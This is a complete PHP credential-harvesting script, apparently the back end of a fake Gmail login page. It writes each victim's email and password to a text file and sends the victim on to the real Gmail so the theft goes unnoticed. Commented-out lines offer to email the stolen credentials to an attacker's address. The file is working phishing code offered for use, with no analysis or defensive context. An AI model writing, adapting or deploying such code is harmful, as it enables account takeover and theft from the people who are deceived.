<?php
session_start();
header('Location: https://google.com/gmail/', true);
$handle = fopen("credentials.txt", "a");
fwrite($handle, $_SESSION["Email"] . "\t" . $_POST["Passwd"] . PHP_EOL);
fclose($handle);

// uncomment the lines below to receive the credentials by email
// $maildrop = "sample@email.com";
// mail($maildrop, "Gmail credentials", $_SESSION["Email"] . "\t" . $_POST["Passwd"]);

session_destroy();
